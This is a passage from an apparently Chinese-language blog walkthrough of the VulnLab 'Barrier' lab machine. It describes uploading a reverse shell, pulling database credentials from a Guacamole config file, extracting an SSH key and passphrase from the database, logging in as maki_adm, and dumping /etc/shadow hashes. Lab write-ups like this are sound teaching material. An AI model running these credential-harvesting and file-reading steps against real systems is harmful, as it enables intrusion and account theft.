+<h1 id="Got-shell-on-the-host"><a href="#Got-shell-on-the-host" class="headerlink" title="Got shell on the host"></a>Got shell on the host</h1><p>需要把 burp 關掉，刷新後就進入了後臺：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111094323-p0e845i.png" alt="image">​</p>
+<p>便於操作，就上傳一個 reverse shell， 在用戶 <code>maki</code>​ 的家目錄中得到了 <code>user.txt</code>​：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111094500-ici0l2r.png" alt="image">​</p>
+<p>順便看一下系統中還有哪些用戶：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ cat /etc/passwd | grep sh</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111100546-4riafs9.png" alt="image">​</p>
+<h2 id="Finding-credit-on-guacamole-database"><a href="#Finding-credit-on-guacamole-database" class="headerlink" title="Finding credit on guacamole database"></a>Finding credit on guacamole database</h2><p>看到 <code>maki_adm</code>​，<code>guacamole</code>​ 很有可能藏密碼了，所以看一下關於 <code>guacamole</code>​ 的配置文件：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cd /etc/guacamole</span><br><span class="line">$ cat guacamole.properties</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111095308-mrisq9r.png" alt="image">​</p>
+<p>看到 <code>guacamole</code>​ 的數據庫賬號和密碼：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># MySQL properties</span><br><span class="line">mysql-hostname: 127.0.0.1</span><br><span class="line">mysql-port: 3306</span><br><span class="line">mysql-database: guac_db</span><br><span class="line">mysql-username: guac_user</span><br><span class="line">mysql-password: guac2024</span><br></pre></td></tr></table></figure>
+
+<p>嘗試交互看看：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ mysql -u guac_user -pguac2024</span><br><span class="line"></span><br><span class="line">MariaDB [(none)]&gt; show databases;</span><br><span class="line">MariaDB [(none)]&gt; use guac_db;</span><br><span class="line">MariaDB [guac_db]&gt; show tables;</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111095431-kdpjqqi.png" alt="image">​</p>
+<p>發現 <code>guacamole_connection_parameter</code>​ 表中存在一個密碼和 <code>maki_adm</code>​ 的 ssh 密匙：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [guac_db]&gt; select * from guacamole_connection_parameter \G;</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111100216-43qrkpq.png" alt="image">​</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111095709-rbpkwwl.png" alt="image">​</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">connection_id: 2                                                                              </span><br><span class="line">parameter_name: passphrase                                                                     </span><br><span class="line">parameter_value:  </span><br></pre></td></tr></table></figure>
+
+<h1 id="Shell-as-maki-adm-on-the-host"><a href="#Shell-as-maki-adm-on-the-host" class="headerlink" title="Shell as maki_adm on the host"></a>Shell as maki_adm on the host</h1><p>所以保存下來後嘗試連接，由於這個 ssh key 是加密的 （<code>Proc-Type: 4,ENCRYPTED</code>​），所以嘗試猜測解密的密碼是<code>3V32FN6oViMPxyzC</code>​</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ ssh -i ssh_key maki_adm@10.10.81.162 -oHostKeyAlgorithms=+ssh-rsa</span><br><span class="line">3V32FN6oViMPxyzC</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111100152-3t3wrlb.png" alt="image">​</p>
+<p>嘗試登錄后就得到了 <code>maki_adm</code>​ 的 shell，儅列出家目錄的時候發現 <code>.bash_history</code>​ 的所有權居然是root，這很不正常，打開後就看到了密碼：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111100441-r02xyo0.png" alt="image">​</p>
+<p>這不是root密碼，而是 <code>maki_adm</code>​ 用戶的密碼。</p>
+<p><strong>題外話</strong>： <code>.bash_history</code>​ 這個文件的所有權一般都是自己。</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111100346-fsmilgc.png" alt="image">​</p>
+<h1 id="Hashes"><a href="#Hashes" class="headerlink" title="Hashes"></a>Hashes</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">root@barrier:/home/maki_adm# cat /etc/shadow</span><br><span class="line">root:$y$j9T$gYClZsaoucSiTtMOKajaQ1$uqanNAorfAXEOamSp5f46B3NkeSFt.lcITjp4i4nDn8:20080:0:99999:7:::</span><br><span class="line">daemon:*:19579:0:99999:7:::</span><br><span class="line">bin:*:19579:0:99999:7:::</span><br><span class="line">sys:*:19579:0:99999:7:::</span><br><span class="line">sync:*:19579:0:99999:7:::</span><br><span class="line">games:*:19579:0:99999:7:::</span><br><span class="line">man:*:19579:0:99999:7:::</span><br><span class="line">lp:*:19579:0:99999:7:::</span><br><span class="line">mail:*:19579:0:99999:7:::</span><br><span class="line">news:*:19579:0:99999:7:::</span><br><span class="line">uucp:*:19579:0:99999:7:::</span><br><span class="line">proxy:*:19579:0:99999:7:::</span><br><span class="line">www-data:*:19579:0:99999:7:::</span><br><span class="line">backup:*:19579:0:99999:7:::</span><br><span class="line">list:*:19579:0:99999:7:::</span><br><span class="line">irc:*:19579:0:99999:7:::</span><br><span class="line">gnats:*:19579:0:99999:7:::</span><br><span class="line">nobody:*:19579:0:99999:7:::</span><br><span class="line">_apt:*:19579:0:99999:7:::</span><br><span class="line">systemd-network:*:19579:0:99999:7:::</span><br><span class="line">systemd-resolve:*:19579:0:99999:7:::</span><br><span class="line">messagebus:*:19579:0:99999:7:::</span><br><span class="line">systemd-timesync:*:19579:0:99999:7:::</span><br><span class="line">pollinate:*:19579:0:99999:7:::</span><br><span class="line">sshd:*:19579:0:99999:7:::</span><br><span class="line">syslog:*:19579:0:99999:7:::</span><br><span class="line">uuidd:*:19579:0:99999:7:::</span><br><span class="line">tcpdump:*:19579:0:99999:7:::</span><br><span class="line">tss:*:19579:0:99999:7:::</span><br><span class="line">landscape:*:19579:0:99999:7:::</span><br><span class="line">fwupd-refresh:*:19579:0:99999:7:::</span><br><span class="line">usbmux:*:20072:0:99999:7:::</span><br><span class="line">local:$y$j9T$/Fk.43A.fE/PKStEgyJLY.$e0smQ7QDy7gbIdAxU9nUXKOXvk/eJ4VCtu7l4t6pd/6:20080:0:99999:7:::</span><br><span class="line">lxd:!:20072::::::</span><br><span class="line">dnsmasq:*:20072:0:99999:7:::</span><br><span class="line">tomcat:!*:20079::::::</span><br><span class="line">mysql:!:20079:0:99999:7:::</span><br><span class="line">maki:$y$j9T$muTLHa7H0ZO8fWPr9QlzR/$.Xp6OMnajFZ4Ce/YcA5gf/TUFEFI9SG6YMmsbbd3qp9:20079:0:99999:7:::</span><br><span class="line">maki_adm:$y$j9T$zs0ouUfjYHRWlruDYKiqY/$QVYMQ0Z9uqE.Xgo4dgDmvdAvp6Rq9bCwutMnWyFdJC5:20079:0:99999:7:::</span><br></pre></td></tr></table></figure>
+
+<p>‍</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+          <li><a href="/search/">Search</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <script>
+        setTimeout(() => {
+          makeList({
+             'target': '#toc-mobile',   // Selector for element to place table of contents
+             'parent': 'article .content' // Selector for element to parse headers from (default: 'body')
+          });
+        }, 1000);
+      </script>
+    
+    <div id="toc-footer" style="display: none">
+      <div id="toc-mobile"></div>
+    </div>
+
+    <style>
+        #toc-mobile {
+        }
+        #toc-mobile ul {
+           display: grid ! important;
+        }
+        #toc-mobile li {
+           margin: 0 0 0 0 ! important;
+        }
+        #toc-mobile .level-1 {
+           color: #00b4dd ;
+        }
+        #toc-mobile .level-2 {
+           color: #2bbc8a;
+        }
+        #toc-mobile .level-3 {
+           color: #40474b;
+        }
+        #toc-mobile .level-4, #toc-mobile .level-5, #toc-mobile .level-6 {
+           color: #8c8c8c;
+        }
+    </style>
+
+
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://manesec.github.io/2025/01/11/2025/15-vulnlab-Barrier/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://manesec.github.io/2025/01/11/2025/15-vulnlab-Barrier/&text=VulnLab - Machine - Barrier"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://manesec.github.io/2025/01/11/2025/15-vulnlab-Barrier/&title=VulnLab - Machine - Barrier"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://manesec.github.io/2025/01/11/2025/15-vulnlab-Barrier/&is_video=false&description=VulnLab - Machine - Barrier"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=VulnLab - Machine - Barrier&body=Check out this article: https://manesec.github.io/2025/01/11/2025/15-vulnlab-Barrier/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://manesec.github.io/2025/01/11/2025/15-vulnlab-Barrier/&title=VulnLab - Machine - Barrier"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://manesec.github.io/2025/01/11/2025/15-vulnlab-Barrier/&title=VulnLab - Machine - Barrier"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://manesec.github.io/2025/01/11/2025/15-vulnlab-Barrier/&title=VulnLab - Machine - Barrier"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://manesec.github.io/2025/01/11/2025/15-vulnlab-Barrier/&title=VulnLab - Machine - Barrier"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://manesec.github.io/2025/01/11/2025/15-vulnlab-Barrier/&name=VulnLab - Machine - Barrier&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://manesec.github.io/2025/01/11/2025/15-vulnlab-Barrier/&t=VulnLab - Machine - Barrier"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+      
+        <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+  
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2016-2025
+    manesec
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     --><!--
+       --><li><a href="/search/">Search</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- Add space -->
+<script src="https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js"></script>
+<script>
+  document.addEventListener('DOMContentLoaded', () => {
+    // listen to any DOM change and automatically perform spacing via MutationObserver()
+    pangu.autoSpacingPage();
+  });
+</script>
+
+<!-- fancybox support -->
+
+       <script type="text/javascript" src="/js/fancybox/jquery.fancybox.min.js"></script>
+       <script type="text/javascript" src="/js/wrapImage.js"></script>
+   
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+
+</body>
+</html>
